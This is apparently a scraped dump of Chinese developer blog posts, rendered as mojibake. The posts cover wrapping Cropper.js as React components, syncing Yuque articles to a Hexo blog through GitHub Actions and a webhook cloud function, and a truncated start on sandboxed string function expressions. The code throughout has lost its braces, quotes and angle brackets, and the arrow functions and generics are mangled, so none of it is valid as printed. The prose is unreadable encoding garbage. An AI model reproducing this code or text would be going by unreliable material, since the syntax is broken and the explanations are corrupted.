åŒ…å«ã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€ï¼Œéœ€è¦åˆ†å¼€è£åˆ‡ æ›¿æ¢å›¾ç‰‡æŒ‰é’® - æ›¿æ¢å›¾ç‰‡åï¼Œã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€éƒ½éœ€è¦æ›¿æ¢ å›¾ç‰‡é¢„è§ˆ - åŒæ ·ã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€ä¹Ÿéœ€è¦åˆ†å¼€é¢„è§ˆ Cropper.js æ˜¯ä¸ªåŸç”Ÿçš„è£åˆ‡åº“ï¼Œåœ¨æˆ‘ä»¬çš„ React é¡¹ç›®ä¸­æŒ‰ç…§ä¸Šé¢çš„åŠŸèƒ½åˆ’åˆ†å°è£…æˆä»¥ä¸‹å‡ ä¸ªç»„ä»¶ï¼š Upload.tsx import React, useContext, memo from react;import Upload as PDUpload from @universe-design/react;import CropperContext from ./Context;type UploadProps = maxSize?: number; children?: React.ReactNode; accept?: string;;export const Upload = memo((props: UploadProps): JSX.Element = const accept = image/*, maxSize = props; const setSrc = useContext(CropperContext); const beforeUpload = (file: File) = // æ£€æŸ¥æ–‡ä»¶å¤§å° if (file.size maxSize file.size maxSize) return PDUpload.LIST_IGNORE; const reader = new FileReader(); reader.onload = () = setSrc?.(reader.result as string); ; reader.readAsDataURL(file); return false; ; return ( PDUpload maxCount=1 beforeUpload=beforeUpload fileList=[] accept=accept props.children /PDUpload );); è¿™ä¸ªç»„ä»¶çš„åŠŸèƒ½å¾ˆç®€å•ï¼Œå°±æ˜¯ä½¿ç”¨ç»„ä»¶åº“çš„ä¸Šä¼ ç»„ä»¶è·å–æ–‡ä»¶çš„ base64ï¼Œç„¶åä¿å­˜åˆ° context é‡Œï¼Œæ–¹ä¾¿è£åˆ‡ç»„ä»¶æ¶ˆè´¹ã€‚ Context.tsx import React, createContext, FC, useMemo, useState, useRef from react;import uniqueId from lodash;export interface CropperState src?: string | undefined; setSrc: (src: string) = void; previewClass: string;export interface CropperProviderProps src?: string | undefined;export const CropperContext = createContextCropperState( as CropperState);export const CropperProvider: FCCropperProviderProps = (props) = const [src, setSrc] = useState(props.src); const previewClass = useRef(uniqueId(image_preview_)); const contextState = useMemoCropperState( () = ( src, setSrc, previewClass: previewClass.current, ), [src] ); return ( CropperContext.Provider value=contextState props.children /CropperContext.Provider );; Prview.tsx import React, useContext, memo from react;import classnames from classnames;import CropperContext from ./Context;import styles from ./index.less;export interface PreviewProps extends React.HTMLAttributesHTMLDivElement name?: string;export const Preview: React.FCPreviewProps = memo((props) = const name = default, className, children, ...rest = props; const previewClass = useContext(CropperContext); return ( div ...rest className=classnames( `$previewClass-$name`, styles[image-preview], className ) children /div );); é¢„è§ˆç»„ä»¶æœ¬èº«ä¹Ÿä¸å¤æ‚ï¼Œå°±æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCropper.js çš„ preview å‚æ•°å¯ä»¥æ˜¯ä¸ªå…ƒç´ ï¼Œå…ƒç´ æ•°ç»„æˆ–è€…èƒ½å¤Ÿè¢« Document.querySelectorAll é€‰ä¸­çš„ class é€‰æ‹©å™¨ï¼Œå› ä¸ºå°è£…æˆäº†é€šç”¨ç»„ä»¶ï¼Œå› æ­¤ä½¿ç”¨äº† lodash çš„ uniqueId æ–¹æ³•ç”Ÿæˆå”¯ä¸€çš„ classï¼Œé˜²æ­¢é¡µé¢å‡ºç°å¤šä¸ª Prview ç»„ä»¶æ—¶ï¼Œclass ç±»åå†²çªã€‚ Cropper.tsx import React, useContext, memo, useRef, useEffect from react;import Cropper from cropperjs;import useMemoizedFn, useInViewport, useUpdateLayoutEffect from ahooks;import classnames from classnames;import cropperjs/dist/cropper.css;import CropperContext from ./Context;import styles from ./index.less;type CropperOptions = Cropper.OptionsHTMLImageElement;type ReactCropperProps = PickCropperOptions, aspectRatio name?: string; style?: React.CSSProperties; className?: string; alt?: string; src?: string; data?: Cropper.Data; onCrop?: (data: Cropper.Data) = void; // ç›‘å¬è£åˆ‡æ¡†çš„å˜åŠ¨;interface ReactCropperElement extends HTMLImageElement cropper: Cropper;export type ReactCropperRef = Cropper;const REQUIRED_IMAGE_STYLES = opacity: 0, maxWidth: 100% ;const ReactCropper = React.forwardRefReactCropperRef, ReactCropperProps( (props, ref) = const name = default, style, className, alt = picture, aspectRatio, data, onCrop, = props; const boxRef = useRefHTMLDivElement(null); const combinedRef = useRefReactCropperElement(null); const cropperState = useContext(CropperContext); // æ˜¯å¦åœ¨å¯æ˜¯åŒºåŸŸå†… const [inViewport] = useInViewport(boxRef); const src = cropperState?.src || props?.src; const preSrc = useRefstring | undefined(src); const preview = `.$cropperState.previewClass-$name`; React.useImperativeHandle(ref, () = combinedRef.current!.cropper); /** * æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ‰èƒ½é‡æ–° render * 1. src åœ°å€å˜æ›´ * 2. åœ¨å¯æ˜¯åŒºåŸŸå†…ï¼ˆå¦‚æœä¸åœ¨å¯è§†åŒºåŸŸï¼Œrender æ—¶ä¼šå‡ºé—®é¢˜ï¼‰ */ useEffect(() = if ( combinedRef.current?.cropper typeof src !== undefined inViewport src !== preSrc.current ) combinedRef.current.cropper.reset().clear().replace(src); preSrc.current = src; , [inViewport, src]); const handleCrop = useMemoizedFn(() = if (combinedRef.current?.cropper) onCrop?.(combinedRef.current?.cropper.getData()); ); useUpdateLayoutEffect(() = data combinedRef.current?.cropper.setData(data); , [data]); useUpdateLayoutEffect(() = aspectRatio combinedRef.current?.cropper.setAspectRatio(aspectRatio); , [aspectRatio]); useEffect(() = if (combinedRef.current !== null) // eslint-disable-next-line no-new new Cropper(combinedRef.current, viewMode: 1, // é™åˆ¶è£å‰ªæ¡†ä¸èƒ½è¶…å‡ºå›¾ç‰‡çš„èŒƒå›´ dragMode: crop, // æ‹–æ‹½å›¾ç‰‡æ—¶å½¢æˆæ–°çš„è£å‰ªæ¡† guides: true, // æ˜¯å¦æ˜¾ç¤ºè£å‰ªæ¡†çš„è™šçº¿ scalable: false, // æ˜¯å¦å¯ä»¥ç¼©æ”¾å›¾ç‰‡ï¼ˆå¯ä»¥æ”¹å˜é•¿å®½ï¼‰ zoomable: false, // æ˜¯å¦å¯ä»¥ç¼©æ”¾å›¾ç‰‡ï¼ˆæ”¹å˜ç„¦è·ï¼‰ zoomOnTouch: false, // æ˜¯å¦å¯ä»¥é€šè¿‡æ‹–æ‹½è§¦æ‘¸ç¼©æ”¾å›¾ç‰‡ zoomOnWheel: false, // æ˜¯å¦å¯ä»¥é€šè¿‡é¼ æ ‡æ»šè½®ç¼©æ”¾å›¾ç‰‡ center: false, // æ˜¯å¦æ˜¾ç¤ºè£å‰ªæ¡†ä¸­é—´çš„ â€˜+â€™ æŒ‡ç¤ºå™¨ responsive: false, // æ˜¯å¦åœ¨çª—å£å°ºå¯¸è°ƒæ•´å è¿›è¡Œå“åº”å¼çš„é‡æ¸²æŸ“ movable: false, // æ˜¯å¦å¯ä»¥ç§»åŠ¨å›¾ç‰‡ preview, aspectRatio, // è®¾ç½®è£å‰ªæ¡†ä¸ºå›ºå®šçš„å®½é«˜æ¯” data, // ä¹‹å‰å­˜å‚¨çš„è£å‰ªåçš„æ•°æ® åœ¨åˆå§‹åŒ–æ—¶ä¼šè‡ªåŠ¨è®¾ç½® crop: handleCrop, ); return () = combinedRef.current?.cropper?.destroy(); ; // eslint-disable-next-line react-hooks/exhaustive-deps , [preview, handleCrop]); return ( div style=style className=classnames(styles.cropper, className) ref=boxRef img src=src alt=alt style=REQUIRED_IMAGE_STYLES ref=combinedRef / /div ); );export default memo(ReactCropper); æœ€åå°±æ˜¯é‡å¤´æˆçš„ Cropper äº†ï¼Œç»„ä»¶å†…éƒ¨å°è£…äº† Cropper.js åˆå§‹åŒ–é€»è¾‘ï¼Œå›¾ç‰‡åˆ‡æ¢çš„é€»è¾‘ã€‚ index.tsx import CropperInner from ./Cropper;import CropperProvider from ./Context;import Upload from ./Upload;import Preview from ./Preview;export * from ./Cropper;export * from ./Context;const Cropper = Object.assign(CropperInner, Upload, Provider: CropperProvider, Preview,);export default Cropper; æœ€åå°±æ˜¯å°†è¿™äº›ç»„ä»¶å…¨éƒ¨æŒ‚è½½åˆ° Cropperï¼Œå¯¹å¤–åªæš´éœ² Cropper è¿™ä¸€ä¸ªç»„ä»¶ã€‚ ä½¿ç”¨ä½¿ç”¨å°è£…åçš„ Cropper ç»„ä»¶å¤§æ¦‚å¦‚ä¸‹ï¼Œå…¶ä¸­ Cropper ç»„ä»¶å’Œ Cropper.Preview ç»„ä»¶å¯ä»¥æœ‰ä»»æ„å¤šä¸ªï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œä¸¤ä¸ªç»„ä»¶çš„ name å­—æ®µè¦ä¸€ä¸€å¯¹åº”ï¼Œå¦åˆ™ä¼šå‡ºç°æ— æ³•å®æ—¶é¢„è§ˆçš„æƒ…å†µã€‚ import Cropper from ./Cropper;export default () = return ( Cropper.Provider src=xxxxx // è£åˆ‡ç»„ä»¶ Cropper aspectRatio=PC_CROP_RATIO name=PC ref=(ref) = setRef(ref!, TYPE.web) className=styles[container-cropper] onCrop=(data) = handleCrop(data, TYPE.web) data=cacheValue.current?.tailored_info?.web / // ä¸Šä¼ ç»„ä»¶ Cropper.Upload accept=UPLOAD_ACCEPT maxSize=UPLOAD_MAX_SIZE Button type=linki18next.t(replace-image)/Button /Cropper.Upload // é¢„è§ˆç»„ä»¶ Cropper.Preview style=bannerStyle className=styles[preview-mobile] name=mobile / /Cropper.Provider );; æ ·å¼è¦†ç›–ç»„ä»¶é€»è¾‘è§£å†³äº†ï¼Œç°åœ¨è§£å†³æ ·å¼é—®é¢˜ã€‚æˆ‘ä»¬ä¹‹å‰å¼•å…¥äº† cropperjs çš„é»˜è®¤æ ·å¼æ–‡ä»¶ï¼Œç°åœ¨åªéœ€è¦è¦†ç›–æ‰å®ƒçš„æ ·å¼å°±å¯ä»¥äº† // å¤å†™ Cropper çš„æ ·å¼.cropper :global .cropper-modal opacity: 0.4; .cropper-line background-color: #fff; .cropper-point .point-e, .point-n, .point-w, .point-s display: none; .point-ne, .point-nw, .point-sw, .point-se width: 20px; height: 20px; background: transparent; opacity: 1; .point-nw, .point-ne border-top: 3px solid #fff; .point-nw, .point-sw border-left: 3px solid #fff; .point-ne, .point-se border-right: 3px solid #fff; .point-sw, .point-se border-bottom: 3px solid #fff; .cropper-view-box outline-color: #fff; .cropper-dashed border-style: solid; opacity: 1; é—®é¢˜ è·å–è£åˆ‡åå›¾ç‰‡ blob å›¾ç‰‡è£åˆ‡ï¼Œéœ€è¦è·å–è£åˆ‡å›¾ç‰‡çš„ blob ä¸Šä¼ åˆ° CDNï¼ŒCropperjs æä¾›äº†è·å– blob çš„æ–¹æ³•ï¼š cropper.getCroppedCanvas().toBlob((blob) = ) ä½†æ˜¯åœ¨æˆ‘ä»¬ä¸šåŠ¡çš„åœºæ™¯ä¸‹ï¼ŒåŒæ—¶ä¼šå­˜åœ¨ä¸¤ä¸ªè£åˆ‡æ¡†åˆ†åˆ«ç”¨æ¥è£åˆ‡ã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€ï¼Œç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªå›¾ç‰‡ï¼Œä¹Ÿå°±æ˜¯è¯´æ›¿æ¢å›¾ç‰‡ä¼šåŒæ—¶æ›¿æ¢ã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€çš„å›¾ç‰‡ã€‚è¿™å°±å¯¼è‡´äº†æ›¿æ¢å›¾ç‰‡åï¼Œåªæœ‰å½“å‰æ¿€æ´»çš„ tab ä¸‹çš„ cropper è°ƒç”¨ getCroppedCanvas æ‰èƒ½è·å–åˆ°æ›¿æ¢å›¾ç‰‡åçš„æ•°æ®ï¼Œæ²¡æœ‰æ¿€æ´»çš„ tab ä¸‹è¿˜æ˜¯è·å–æ—§å›¾ç‰‡çš„æ•°æ®ã€‚ å¤ç°è·¯å¾„ï¼š é™¤éåœ¨æäº¤å‰ï¼Œæ‰‹åŠ¨åˆ‡æ¢åˆ°ç§»åŠ¨ç«¯çš„ tabï¼Œä¸ç„¶è¯¥é—®é¢˜ä¼šä¸€ç›´å­˜åœ¨ï¼Œè¿™æ˜¯ cropperjs å†…éƒ¨å®ç°çš„é—®é¢˜ï¼Œæˆ‘ä»¬ä¸èƒ½è¦æ±‚ç”¨æˆ·å¤šè¿™ä¹ˆä¸€ä¸ªæ— æ„ä¹‰çš„æ­¥éª¤ï¼Œå› æ­¤æˆ‘ä»¬è‡ªå·±å®ç° ã€ŒgetCroppedCanvasã€æ–¹æ³•ï¼Œä¸ç”¨ cropperjs æš´éœ²çš„æ–¹æ³• // ä½¿ç”¨ canvas è£åˆ‡å›¾ç‰‡export const cropImage = (source: string, options: Options) = const width, height, x, y = options; const canvas = document.createElement(canvas); const context = canvas.getContext(2d)!; const image = new Image(); image.src = source; image.crossOrigin = anonymous; return new PromiseHTMLCanvasElement((resolve) = image.onload = () = const [px, py, pw, ph] = [ inRange(x, 0, image.width) ? x : 0, inRange(y, 0, image.height) ? y : 0, inRange(width, 0, image.width) ? width : image.width, inRange(height, 0, image.height) ? height : image.height, ].map((param) = Math.floor(normalizeDecimalNumber(param))); canvas.width = pw; canvas.height = ph; context.imageSmoothingEnabled = true; context.imageSmoothingQuality = low; context.drawImage(image, px, py, pw, ph, 0, 0, pw, ph); context.restore(); resolve(canvas); ; );;"},{"title":"è¯­é›€åŒæ­¥åˆ° Github Hexo","path":"/2023/01/31/5e91c1995fd8/","content":"èƒŒæ™¯æˆ‘çš„åšå®¢éƒ½æ˜¯ç”¨ Hexo åœ¨æœ¬åœ°å†™å®Œï¼Œæäº¤ä¸ª commit åˆ° Githubï¼Œè§¦å‘ Github Action è‡ªåŠ¨éƒ¨ç½²åˆ° Github Page ä¸Šã€‚é™¤äº†ç”¨ Vscode å†™ Markdown æœ‰ç‚¹éš¾å—å¤–ï¼Œå…¶å®ƒåœ°æ–¹è¿˜å¥½ï¼Œè‡³äºä¸ºä»€ä¹ˆä¸€å®šè¦ç”¨ Hexo + Github çš„ç»„åˆï¼Œç™½å«– Github çš„æœåŠ¡å™¨å®ƒä¸é¦™å—ï¼Ÿ ä½†æ˜¯ï¼Œæœ€è¿‘ä½“éªŒäº†ä¸‹è¯­é›€ï¼Œå‘ç°ä»–çš„æ–‡æœ¬ç¼–è¾‘å™¨è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œå†™æ–‡æ¡£å¾ˆæ˜¯ä¸æ»‘ï¼Œæ­£å¥½åœ¨ Github ä¸Šå‘ç°äº†ä¸ªé¡¹ç›® - https://github.com/x-cold/yuque-hexoï¼Œå¯ä»¥å°†è¯­é›€çš„æ–‡ç« åŒæ­¥åˆ° Hexo ä¸­ï¼Œæ˜¯æ—¶å€™æ”¹å˜ä¸‹åšå®¢å†™ä½œæµç¨‹äº†ã€‚ä¸‹é¢å°±è®°å½•äº†æ•´ä¸ªè¿ç§»è¿‡ç¨‹ã€‚ å®‰è£…åŠé…ç½® yuque-hexoåœ¨ hexo é¡¹ç›®çš„æ ¹ç›®å½•ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå®‰è£… yuque-hexoï¼š yarn add yuque-hexo -D 1. æ–°å¢é…ç½®ï¼š yuqueConfig: postPath: source/_posts/yuque, cachePath: yuque.json, mdNameFormat: title, adapter: hexo, concurrency: 5, baseUrl: https://www.yuque.com/api/v2, login: bijinfeng-fyjgs, repo: blog, onlyPublished: true, onlyPublic: false, imgCdn: concurrency: 0, imageBed: upyun, enabled: true, bucket: xxxx, prefixKey: yuque yuqueConfig ä¸­æ¯ä¸ªå­—æ®µçš„ä½œç”¨åœ¨ yuque-hexo çš„ README ä¸­éƒ½æœ‰è¯´æ˜ï¼Œæˆ‘è¿™é‡ŒæŒ‘å‡ ä¸ªé‡ç‚¹çš„è¯´ä¸‹ï¼š login - ä¸ªäººè·¯å¾„ repo - çŸ¥è¯†åº“è·¯å¾„ 2. æ–°å¢è„šæœ¬è¿™äº›è„šæœ¬ä¸»è¦ç”¨åœ¨åé¢çš„ Github Action ä¸­ï¼Œå½“ç„¶ä¹Ÿæ–¹ä¾¿æœ¬åœ°è°ƒè¯•ä½¿ç”¨ scripts: clean:yuque: yuque-hexo clean, sync: yuque-hexo sync, reset: npm run clean:yuque npm run sync é…ç½® Github Actionåœ¨ä¿®æ”¹ Github Action é…ç½®æ–‡ä»¶å‰ï¼Œæˆ‘ä»¬å…ˆéœ€è¦è·å–å‡ ä¸ª Tokenï¼š YUQUE_TOKEN æ–°å¢æˆ–ä½¿ç”¨ç°æœ‰çš„ Tokenï¼ŒToken ç»™ä¸ªè¯»å–æƒé™å°±è¡Œäº† SECRET_ID SECRET_KEY å›¾åºŠç›¸å…³çš„å¯†é’¥ï¼Œæˆ‘ç”¨çš„æ˜¯åˆæ‹äº‘ï¼Œéœ€è¦æ“ä½œå‘˜çš„è´¦å·å’Œå¯†ç ï¼ˆå¯†ç å¿˜äº†çš„è¯ï¼Œç‚¹å‡»ç¼–è¾‘æŒ‰é’®ï¼Œé‡æ–°ç”Ÿæˆä¸ªï¼‰ åœ¨ Github é¡¹ç›®çš„ Setting ä¸­æ–°å¢ä¸‰ä¸ªç¯å¢ƒå˜é‡ ä¸Šé¢çš„å˜é‡éƒ½å‡†å¤‡å¥½åï¼Œæ¥åˆ° hexo é¡¹ç›®çš„ .githubworkflows ç›®å½•ï¼Œæ–°å¢ä¸ª deploy.yml æ–‡ä»¶: name: Build and Deployon: push: branches: - masterjobs: build-and-deploy: environment: github-pages env: yuque_token: $ secrets.YUQUE_TOKEN secret_id: $ secrets.SECRET_ID secret_key: $ secrets.SECRET_KEY runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@master with: submodules: true - name: Install Dependencies run: yarn install - name: Sync Yuque run: YUQUE_TOKEN=$ env.yuque_token SECRET_ID=$ env.secret_id SECRET_KEY=$ env.secret_key yarn sync - name: Generate run: yarn build - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: $ secrets.ACCESS_TOKEN publish_dir: ./public æˆ–è€…ä½ çš„é¡¹ç›®ä¸­åŸæœ¬å°±æœ‰ Action çš„é…ç½®ï¼Œç°åœ¨åªéœ€è¦å¢åŠ  yuque-hexo çš„ç›¸å…³é…ç½®å°±è¡Œï¼š æ¶ˆè´¹ä¸Šé¢è®¾ç½®çš„ç¯å¢ƒå˜é‡ æ³¨æ„ environment å­—æ®µå¿…é¡»å’Œä½ åœ¨ Github Setting ä¸­é…ç½®çš„ Environments å­—æ®µå¯¹åº”ä¸Š environment: github-pages env: yuque_token: $ secrets.YUQUE_TOKEN secret_id: $ secrets.SECRET_ID secret_key: $ secrets.SECRET_KEY åœ¨è¿è¡Œ hexo generate ä¹‹å‰ï¼Œå…ˆåŒæ­¥è¯­é›€çš„æ–‡ç«  - name: Sync Yuque run: YUQUE_TOKEN=$ env.yuque_token SECRET_ID=$ env.secret_id SECRET_KEY=$ env.secret_key yarn sync åˆ°è¿™é‡Œ yueque-hexo çš„é…ç½®å·¥ä½œå°±å®Œæˆäº†ï¼Œä¿å­˜ï¼Œæäº¤ commit åˆ° GitHub ä¸Šè§¦å‘ Actionï¼Œå¦‚æœä¸€åˆ‡é¡ºåˆ©çš„è¯è¯­é›€çš„æ–‡ç« å°±ä¼šåŒæ­¥è¿‡æ¥ã€‚ ä¸»åŠ¨åŒæ­¥ä¸Šé¢çš„åŠ¨ä½œå®Œæˆåï¼Œæˆ‘ä»¬è™½ç„¶èƒ½å¤ŸåŒæ­¥è¯­é›€çš„æ–‡ç« ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨è¯­é›€å†™å®Œæ–‡ç« åï¼Œè¿˜éœ€è¦åˆ° github ä¸Šæ‰‹åŠ¨è§¦å‘ä¸‹ Actionï¼Œä½“éªŒè¿˜æ˜¯ä¸å¤Ÿå®Œç¾ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªæ–¹æ¡ˆï¼š å®šä¹‰ä»»åŠ¡ç»™ Action æ·»åŠ ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œåœ¨æ¯å¤©çš„ 2:00 åŒæ­¥ä¸€æ¬¡è¯­é›€ on: schedule: - cron: 0 2 * * * webhook åœ¨è¯­é›€å†™å®Œæ–‡ç« åï¼Œè‡ªåŠ¨è§¦å‘ä¸ª webhookï¼Œå¯åŠ¨ Github Action åŒæ­¥æ–‡ç«  ä½¿ç”¨ API è¿œç¨‹è§¦å‘ Github Action ç°åœ¨ Action åªèƒ½åœ¨æäº¤ commit åè§¦å‘ï¼Œæ–°å¢ä¸ªé…ç½®ï¼Œè®© Action æ”¯æŒè¢« api è§¦å‘ï¼š on: push: branches: - master # å…è®¸å¤–éƒ¨ä»“åº“äº‹ä»¶è§¦å‘ repository_dispatch: types: # è¿™é‡Œçš„å€¼éœ€è¦å’Œä¸‹æ–‡çš„äº‘å‡½æ•°çš„event_typeä¿æŒä¸€è‡´ - webhook è®¿é—®é“¾æ¥é¡µé¢ https://github.com/settings/tokens/new ç”³è¯·ä¸€ä¸ª Tokenï¼Œéœ€è¦å‹¾é€‰ repo æƒé™ã€‚ API è°ƒç”¨æ ¼å¼ curl -X POST https://api.github.com/repos/:owner/:repo/dispatches \\ -H Accept: application/vnd.github.everest-preview+json \\ -H Authorization: token TRIGGER_TOKEN \\ --data event_type: TRIGGER_EVENT å…¶ä¸­ï¼Œowner æ˜¯ç”¨æˆ·åï¼Œrepo æ˜¯ä»“åº“åï¼Œ TRIGGER_TOKEN æ˜¯ä¸Šé¢ç”³è¯·çš„ Token å‡­è¯ï¼ŒTRIGGER_EVENT æ˜¯è‡ªå®šä¹‰çš„äº‹ä»¶åã€‚ è‹¥æ˜¯è¯­é›€æ”¯æŒè‡ªå®šä¹‰ webhook æ ¼å¼ï¼Œé‚£ä¹ˆæœ¬æ–‡åˆ°è¿™é‡Œå°±è¦ç»“æŸäº†ï¼Œå¯æƒœå¤©å…¬ä¸ä½œç¾ï¼Œè¯­é›€åªæ”¯æŒé…ç½®ä¸ªæ¥å£ URLã€‚é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦å€ŸåŠ©äº‘å‡½æ•°æ¥å€’ä¸€æ‰‹äº†ï¼Œä»£ç†åçš„è°ƒç”¨è·¯å¾„å˜æˆï¼šè¯­é›€ webhook - äº‘å‡½æ•° - gtihub apiã€‚ è…¾è®¯äº‘å‡½æ•° æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯è…¾è®¯äº‘å‡½æ•°ï¼Œå…¶å®ƒäº‘æœåŠ¡å•†çš„äº‘å‡½æ•°åªèƒ½è‡ªå·±æ¢ç´¢äº†ã€‚ æ–°å»ºä¸ªäº‘å‡½æ•°ï¼Œæˆ‘ä»¬åªè¦åšä¸ªæ¥å£è½¬å‘ï¼Œä¸ç”¨é‚£ä¹ˆéº»çƒ¦å°±ä¸ç”¨æ¨¡æ¿äº†ï¼ˆä½œä¸ºå‰ç«¯ er å½“ç„¶é¦–é€‰ nodeï¼‰ï¼š ä¸‹é¢ç¼–è¾‘äº‘å‡½æ•°: use strict;const request = require(request);exports.main_handler = async (event, context) = const res = await new Promise((resolve, reject) = request( url: https://api.github.com/repos/:owner/:repo/dispatches, method: POST, json: true, headers: User-Agent: curl/7.52.1, Content-Type: application/json, Authorization: token xxxxx, Accept: application/vnd.github.everest-preview+json, , body: event_type: webhook , , function (error, response, body) if (response.status_code == 204) resolve(response); else reject(error); ); ); return res;; è§¦å‘å™¨è®¾ç½®ï¼Œè§¦å‘æ–¹å¼é€‰æ‹©ã€ŒAPI ç½‘å…³è§¦å‘ã€ï¼Œå…¶å®ƒé»˜è®¤ï¼š åˆ›å»ºæˆåŠŸåï¼Œè…¾è®¯äº‘ä¼šæä¾›ä¸ªå…¬ç½‘è®¿é—®è·¯å¾„ï¼Œå°†å…¶é…ç½®åˆ°çŸ¥è¯†åº“çš„ã€Œæ¶ˆæ¯æ¨é€ã€è®¾ç½®ä¸­ï¼š AirCodeè…¾è®¯äº‘ serverless å¹¶ä¸æ˜¯å…è´¹çš„ï¼Œå‰ä¸‰ä¸ªæœˆæœ‰å…è´¹é¢åº¦,ä¹‹åæ”¶è´¹ï¼Œæ—¢ç„¶è¦ç™½å«–å°±ç™½å«–åˆ°åº•ã€‚ æ¨èä½¿ç”¨ https://aircode.io/ï¼Œæ¯æœˆçš„å…è´¹é¢åº¦å¦‚ä¸‹ï¼Œç»å¯¹å¤Ÿä½ ä½¿ç”¨äº†ï¼š ä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œæ–°å»ºä¸ªé¡¹ç›®åï¼Œæ·»åŠ ä¸‰ä¸ªç¯å¢ƒå˜é‡ å¡«å…¥ä»¥ä¸‹ä»£ç ï¼š // @see https://docs.aircode.io/guide/functions/const aircode = require(aircode);const axios = require(axios);module.exports = async function (params, context) const res = await axios( url: `https://api.github.com/repos/$process.env.owner/$process.env.repo/dispatches`, method: post, headers: User-Agent: curl/7.52.1, Content-Type: application/json, Authorization: `token $process.env.token`, Accept: application/vnd.github.everest-preview+json, , data: event_type: webhook , ); if (res.status) return å›è°ƒè¯·æ±‚æˆåŠŸ; return res;; ç‚¹å‡» deployæŒ‰é’®å‘å¸ƒåï¼Œä¼šå¾—åˆ°äº‘å‡½æ•°çš„å…¬ç½‘è®¿é—®è·¯å¾„ï¼Œå¡«åˆ°è¯­é›€çš„çŸ¥è¯†åº“é…ç½®ä¸­å³å¯ã€‚ å‘å¸ƒæ–‡ç« ç°åœ¨ï¼Œåœ¨å‘å¸ƒå’Œæ›´æ–°æ–‡ç« åï¼Œå³å¯è§¦å‘ Actionã€‚ æ³¨æ„äº‹é¡¹ ä¸è¦å¼€å¯è‡ªåŠ¨å‘å¸ƒï¼Œå¦åˆ™æ— æ³•è§¦å‘ webhook"},{"title":"JS - å­—ç¬¦ä¸²å‡½æ•°è¡¨è¾¾å¼","path":"/2023/01/29/0c6c2b4b35c0/","content":"æœ€è¿‘åœ¨åšä¸€ä¸ªéœ€è¦ï¼Œéœ€è¦å®ç°ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„â€œå‡½æ•°è¡¨è¾¾å¼â€ï¼Œä»¥åŒæ‹¬å·â€œ{{â€¦}}â€ä¸ºè¯­æ³•ç‰¹å¾ã€‚ä¾‹å¦‚ï¼š titleï¼šformData.x.y === us ? ç¾å…ƒ:äººæ°‘å¸ å¹¶ä¸”å‡½æ•°è¡¨è¾¾å¼å†…ç½®äº†ä¸€äº›å…³é”®è¯ï¼š $self - ä»£è¡¨å½“å‰å­—æ®µå®ä¾‹ï¼Œç”¨æ¥è·å–å½“å‰å­—æ®µçš„å€¼å’Œ schema é…ç½® $values - ä»£è¡¨æ•´ä¸ªè¡¨å•æ•°æ® $form - ä»£è¡¨å½“å‰ Form å®ä¾‹ï¼Œå¯ä»¥ç”¨æ¥è§¦å‘è¡¨å•æ ¡éªŒç­‰æ“ä½œ $deps - è·å– dependencies ä¸­ä¾èµ–é¡¹çš„å€¼ï¼Œå’Œ dependencies é¡ºåºä¸€è‡´ $fetch - ä½¿ç”¨å°è£…çš„ request æ–¹æ³•ï¼Œå‘é€ http è¯·æ±‚ ä½¿ç”¨äº†å…³é”®è¯çš„è¡¨è¾¾å¼å¦‚ä¸‹ï¼š select_options: $self.select_options.map(item = ( ...item, disabled: $deps[0].map(it = it.bank_card_usage).includes(item.value) )); å‡½æ•°è¡¨è¾¾å¼å¯èƒ½ç”±åç«¯ä¸‹å‘æˆ–è€…ç”¨æˆ·è¾“å…¥ï¼Œå› æ­¤ä¸ºé˜²æ­¢ XSS æ³¨å…¥ï¼Œå‡½æ•°è¡¨è¾¾å¼çš„ä½œç”¨åŸŸéœ€è¦é™åˆ¶ä¸‹ã€‚ å®ç°new Function è¯­æ³• å¼•ç”¨è‡ªï¼šæ·±å…¥ JS new Function è¯­æ³• Â« å¼ é‘«æ—­-é‘«ç©ºé—´-é‘«ç”Ÿæ´» å®ç°å‡½æ•°è¡¨è¾¾å¼ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå¤ä¹ ä¸‹ new Function è¯­æ³•ï¼š let func = new Function([arg1, arg2, ...argN], functionBody); æœ€åä¸€ä¸ªå‚æ•°ä¸€å®šæ˜¯å‡½æ•°ä½“ï¼Œå…¶ä½™å‚æ•°éƒ½ä½œä¸ºä¼ ç»™å‡½æ•°ä½“çš„å‚æ•°ã€‚ ä¾‹å¦‚ï¼š let sum = new Function(a, b, return a + b);console.log(sum(1, 2)); // ç»“æœæ˜¯ 3 å¹³å¸¸è¿›è¡Œ JS æˆ–è€… Node.js å¼€å‘çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰ä»»ä½•ç†ç”±ä½¿ç”¨ new Function æ„é€ å‡½æ•°çš„ï¼Œå› ä¸ºæ²¡å¿…è¦ï¼Œç›´æ¥ä½¿ç”¨ function æˆ–è€… () {} ç®­å¤´å‡½æ•°å†™æ³•å°±å¥½äº†ã€‚ é‚£æ˜¯ä¸æ˜¯è¡¨ç¤º new Function è¯­æ³•æ˜¯ä¸ªé¸¡è‚‹ç‰¹æ€§å‘¢ï¼Ÿ ä¸ï¼ç»ä¸æ˜¯ï¼ new Function 